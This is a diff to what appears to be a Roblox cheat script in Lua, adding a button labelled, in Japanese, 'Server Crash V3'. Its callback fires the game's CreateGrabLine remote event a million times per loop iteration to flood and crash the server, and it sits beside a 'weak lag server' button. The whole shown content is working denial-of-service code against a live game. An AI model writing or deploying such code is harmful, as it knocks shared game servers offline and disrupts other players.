@@ -1259,6 +1259,25 @@ end
 end
 })
 ServerTab:AddButton({
+Name = "サーバークラッシュV3",
+Callback = function()
+local startTime = tick()
+local isLooping = true
+while isLooping do
+for i = 1, 1000000 do
+game:GetService("ReplicatedStorage").GrabEvents.CreateGrabLine:FireServer(
+workspace:FindFirstChildOfClass("Part"),
+CFrame.new(math.random(-0, 0), math.random(-0, 0), math.random(-0, 0))
+)
+end
+wait()
+if tick() - startTime >= wait(0.1) then
+isLooping = false
+end
+end
+end
+})
+ServerTab:AddButton({
 Name = "弱いラグサーバー",
 Callback = function()
 local startTime = tick()
